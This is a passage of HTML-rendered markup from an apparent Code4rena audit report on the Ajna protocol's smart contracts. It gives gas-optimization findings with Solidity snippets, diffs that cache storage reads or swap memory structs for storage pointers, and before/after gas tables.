class=\"mtk7\">743</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">screeningVotesCast</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposal_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">account_</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">votes_</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// @audit: 2nd sload</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"138\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 928b337..9ed774a 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -703,7 +703,8 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint24 distributionId = proposal_.distributionId;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // check that the voter has enough voting power to cast the vote</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (screeningVotesCast[distributionId][account_] + votes_ &gt; _getVotesScreening(distributionId, account_)) revert InsufficientVotingPower();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 _screeningVotesCast = screeningVotesCast[distributionId][account_];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (_screeningVotesCast + votes_ &gt; _getVotesScreening(distributionId, account_)) revert InsufficientVotingPower();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256[] storage currentTopTenProposals = _topTenProposals[distributionId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 proposalId = proposal_.proposalId;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -740,7 +741,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // record voters vote</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        screeningVotesCast[proposal_.distributionId][account_] += votes_;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        screeningVotesCast[proposal_.distributionId][account_] = _screeningVotesCast + votes_;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // emit VoteCast instead of VoteCastWithParams to maintain compatibility with Tally</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         emit VoteCast(</span></span></span></code></pre>\n<h2 id=\"g-03-refactor-internal-function-to-avoid-unnecessary-sload\" style=\"position:relative;\"><a href=\"#g-03-refactor-internal-function-to-avoid-unnecessary-sload\" aria-label=\"g 03 refactor internal function to avoid unnecessary sload permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-03] Refactor internal function to avoid unnecessary SLOAD</h2>\n<p>The internal functions below read storage slots that are previously read in the functions that invoke them. We can refactor the internal functions so we could pass cached storage variables as stack variables and avoid the extra storage reads that would otherwise take place in the internal functions.</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L227-L229\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L227-L229</a></p>\n<p><em>Gas Savings for <code>GrantFund.startNewDistributionPeriod</code>, obtained via protocol’s tests: Avg 159 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>75597</td>\n</tr>\n<tr>\n<td>After</td>\n<td>75438</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"139\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">227</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_setNewDistributionId</span><span class=\"mtk1\">() </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newId_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">228</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">newId_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_currentDistributionId</span><span class=\"mtk1\"> += </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">229</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"140\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 928b337..87dd264 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -143,7 +143,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint48 endBlock = startBlock + DISTRIBUTION_PERIOD_LENGTH;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // set new value for currentDistributionId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        newDistributionId_ = _setNewDistributionId();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        newDistributionId_ = _setNewDistributionId(currentDistributionId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // create QuarterlyDistribution struct</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         QuarterlyDistribution storage newDistributionPeriod = _distributions[newDistributionId_];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -224,8 +224,9 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      * @dev    Increments the previous Id nonce by 1.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      * @return newId_ The new distribution period Id.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    function _setNewDistributionId() private returns (uint24 newId_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        newId_ = _currentDistributionId += 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function _setNewDistributionId(uint24 _currentId) private returns (uint24 newId_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        newId_ = _currentId + 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        _currentDistributionId = newId_;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /************************************/</span></span></span></code></pre>\n<h2 id=\"g-04-using-storage-instead-of-memory-for-structsarrays-saves-gas\" style=\"position:relative;\"><a href=\"#g-04-using-storage-instead-of-memory-for-structsarrays-saves-gas\" aria-label=\"g 04 using storage instead of memory for structsarrays saves gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-04] Using storage instead of memory for structs/arrays saves gas</h2>\n<p>Using a memory pointer for a storage struct/array will effectively load all the fields of that data type from storage (SLOAD) into memory (MSTORE). Using a storage pointer will allow you to read specific fields from storage as you need them. If you are not going to use all of the fields of your data type then you should use a storage pointer so that you don’t incur extra <code>Gcoldsload (2100 gas)</code> for fields that you will never use.</p>\n<p><strong>Note: These are instances that the automated report missed</strong>.</p>\n<p>Total Instances: <code>12</code></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L440-L442\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L440-L442</a></p>\n<p><em>Gas Savings for <code>RewardsManager.claimRewards</code>, obtained via protocol’s tests: Avg 3726 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>393064</td>\n</tr>\n<tr>\n<td>After</td>\n<td>389338</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"141\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RewardsManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">440</span><span class=\"mtk1\">:       </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">positionIndexes_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">441</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">bucketIndex</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positionIndexes_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">442</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">BucketState</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bucketSnapshot</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">stakes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">tokenId_</span><span class=\"mtk1\">].</span><span class=\"mtk12\">snapshot</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bucketIndex</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"142\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/RewardsManager.sol b/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 314b476..bec53c1 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -439,7 +439,7 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // iterate through all buckets and calculate epoch rewards for</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         for (uint256 i = 0; i &lt; positionIndexes_.length; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             bucketIndex = positionIndexes_[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            BucketState memory bucketSnapshot = stakes[tokenId_].snapshot[bucketIndex];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            BucketState storage bucketSnapshot = stakes[tokenId_].snapshot[bucketIndex];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             uint256 bucketRate;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             if (epoch_ != stakingEpoch_) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L236-L250\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L236-L250</a></p>\n<p><em>Gas Savings for <code>GrantFund.claimDelegateReward</code>, obtained via protocol’s tests: Avg 926 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>65340</td>\n</tr>\n<tr>\n<td>After</td>\n<td>64414</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"143\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">236</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claimDelegateReward</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">237:        </span><span class=\"mtk10\">uint24</span><span class=\"mtk1\"> </span><span class=\"mtk10\">distributionId_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">238</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rewardClaimed_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">239</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// Revert if delegatee didn&#39;t vote in screening stage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">240</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">screeningVotesCast</span><span class=\"mtk1\">[</span><span class=\"mtk12\">distributionId_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">DelegateRewardInvalid</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">241</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">242</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">QuarterlyDistribution</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentDistribution</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_distributions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">distributionId_</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">243</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">244</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// Check if Challenge Period is still active</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">245</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk11\">_getChallengeStageEndBlock</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentDistribution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endBlock</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ChallengePeriodNotEnded</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">246</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">247</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// check rewards haven&#39;t already been claimed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">248</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hasClaimedReward</span><span class=\"mtk1\">[</span><span class=\"mtk12\">distributionId_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">]) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RewardAlreadyClaimed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">249</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">250</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">QuadraticVoter</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">voter</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_quadraticVoters</span><span class=\"mtk1\">[</span><span class=\"mtk12\">distributionId_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"144\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 928b337..6b3cc5e 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -239,7 +239,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Revert if delegatee didn&#39;t vote in screening stage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if(screeningVotesCast[distributionId_][msg.sender] == 0) revert DelegateRewardInvalid();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        QuarterlyDistribution memory currentDistribution = _distributions[distributionId_];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        QuarterlyDistribution storage currentDistribution = _distributions[distributionId_];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Check if Challenge Period is still active</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if(block.number &lt; _getChallengeStageEndBlock(currentDistribution.endBlock)) revert ChallengePeriodNotEnded();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -247,7 +247,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // check rewards haven&#39;t already been claimed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if(hasClaimedReward[distributionId_][msg.sender]) revert RewardAlreadyClaimed();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        QuadraticVoter memory voter = _quadraticVoters[distributionId_][msg.sender];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        QuadraticVoter storage voter = _quadraticVoters[distributionId_][msg.sender];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // calculate rewards earned for voting</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         rewardClaimed_ = _getDelegateReward(currentDistribution, voter);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -272,9 +272,9 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      * @return rewards_             The delegate rewards accrued to the voter.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function _getDelegateReward(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        QuarterlyDistribution memory currentDistribution_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        QuadraticVoter memory voter_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    ) internal pure returns (uint256 rewards_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        QuarterlyDistribution storage currentDistribution_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        QuadraticVoter storage voter_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    ) internal view returns (uint256 rewards_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // calculate the total voting power available to the voter that was allocated in the funding stage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 votingPowerAllocatedByDelegatee = voter_.votingPower - voter_.remainingVotingPower;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -918,8 +918,8 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint24 distributionId_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         address voter_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) external view override returns (uint256 rewards_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        QuarterlyDistribution memory currentDistribution = _distributions[distributionId_];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        QuadraticVoter        memory voter               = _quadraticVoters[distributionId_][voter_];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        QuarterlyDistribution storage currentDistribution = _distributions[distributionId_];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        QuadraticVoter        storage voter               = _quadraticVoters[distributionId_][voter_];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         rewards_ = _getDelegateReward(currentDistribution, voter);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L434-L435\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L434-L435</a></p>\n<p><em>Gas 